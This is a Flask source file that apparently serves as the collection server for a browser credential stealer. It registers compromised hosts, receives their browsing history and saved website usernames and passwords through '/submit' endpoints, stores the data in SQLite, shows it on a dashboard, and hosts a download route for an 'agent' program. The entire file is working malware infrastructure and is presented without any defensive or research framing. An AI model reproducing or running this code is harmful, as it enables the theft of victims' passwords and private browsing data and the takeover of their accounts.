from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import os

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, 'hosts.db')

app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{DB_PATH}'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = os.path.abspath(os.path.dirname(__file__))

db = SQLAlchemy(app)

# ======================== MODELS ========================
class Host(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    machine_id = db.Column(db.String(64), unique=True, nullable=False)
    hostname = db.Column(db.String(64))
    ip_address = db.Column(db.String(64))
    os_info = db.Column(db.String(128))
    last_seen = db.Column(db.DateTime, default=datetime.now())

class History(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    machine_id = db.Column(db.String(64), db.ForeignKey('host.machine_id'))
    url = db.Column(db.Text)
    title = db.Column(db.Text)
    visit_time = db.Column(db.String(128))
    browser_type = db.Column(db.String(16))

class Credential(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    machine_id = db.Column(db.String(64), db.ForeignKey('host.machine_id'))
    website = db.Column(db.String(256))
    username = db.Column(db.String(128))
    password = db.Column(db.Text)
    browser_type = db.Column(db.String(16))

# ======================== ROUTES ========================
@app.route("/")
def dashboard():
    hosts = Host.query.all()
    return render_template("index.html", hosts=hosts)

@app.route("/register", methods=["POST"])
def register():
    data = request.json
    host = Host.query.filter_by(machine_id=data['machine_id']).first()
    if host:
        host.last_seen = datetime.now()
    else:
        host = Host(**data)
        db.session.add(host)
    db.session.commit()
    return jsonify({"status": "ok"})

@app.route("/submit/history", methods=["POST"])
def receive_history():
    data = request.json
    for entry in data.get('history', []):
        db.session.add(History(machine_id=data['machine_id'], **entry))
    db.session.commit()
    return jsonify({"status": "ok"})

@app.route("/submit/credentials", methods=["POST"])
def receive_credentials():
    data = request.json
    for entry in data.get('credentials', []):
        db.session.add(Credential(machine_id=data['machine_id'], **entry))
    db.session.commit()
    return jsonify({"status": "ok"})

@app.route("/download/agent")
def download_page():
    return render_template("download.html")

@app.route("/download/<path:filename>")
def download_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename, as_attachment=True)

# ======================== MAIN ========================
if __name__ == "__main__":
    with app.app_context():
        db.create_all()
    app.run(host="0.0.0.0", port=5000)
